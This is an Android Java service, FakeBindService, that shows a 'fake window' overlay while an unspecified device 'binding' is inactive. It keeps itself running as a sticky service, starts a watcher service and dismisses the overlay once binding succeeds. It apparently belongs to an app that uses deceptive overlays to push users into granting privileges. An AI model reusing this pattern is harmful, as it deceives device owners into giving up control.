package com.xstd.ip.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import com.xstd.ip.Config;
import com.xstd.ip.FakeWindowBinding;
import com.xstd.ip.Tools;


/**
 * Created by michael on 13-12-23.
 */
public class FakeBindService extends Service {

    public static final String ACTION_SHOW_FAKE_WINDOW = "com.xstd.plugin.fake";
    public static final String BIND_SUCCESS_ACTION = "com.bind.action.success";
    private boolean mHasRegisted;
    private Handler mHandler = new Handler(Looper.getMainLooper());
    private BroadcastReceiver mBindSuccesBRC = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Tools.goHome(getApplicationContext());

            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
//                    android.os.Process.killProcess(android.os.Process.myPid());
                    if (Config.window != null) {
                        Config.window.dismiss();
                    }
                    Config.window = null;
                }
            }, 300);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        if (Tools.isBindingActive(getApplicationContext())) {
            stopSelf();
            return;
        } else {
            mHasRegisted = true;
            registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
            showFakeWindow();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (mHasRegisted) {
            unregisterReceiver(mBindSuccesBRC);
        }
    }

    private synchronized void showFakeWindow() {
        if (Config.WATCHING_SERVICE_ACTIVE_RUNNING.get()) return;

        if (Config.window == null) {
            Config.window = new FakeWindowBinding(getApplicationContext(), new FakeWindowBinding.WindowListener() {

                @Override
                public void onWindowPreDismiss() {
                    Tools.goHome(getApplicationContext());
                }

                @Override
                public void onWindowDismiss() {
                    Config.window = null;
                    mHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Tools.setDeviceBindingActiveTime(getApplicationContext(), Tools.getDeviceBindingActiveTime(getApplicationContext()) + 1);
                            stopSelf();
                        }
                    }, 300);
                }
            });
            Config.window.show();
            Config.window.updateTimerCount();
            getSharedPreferences(Config.SHARED_PRES, MODE_PRIVATE).edit().putBoolean("showFakeWindow", false).commit();
        }

        Intent i1 = new Intent();
        i1.setClass(getApplicationContext(), WatchBindService.class);
        startService(i1);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
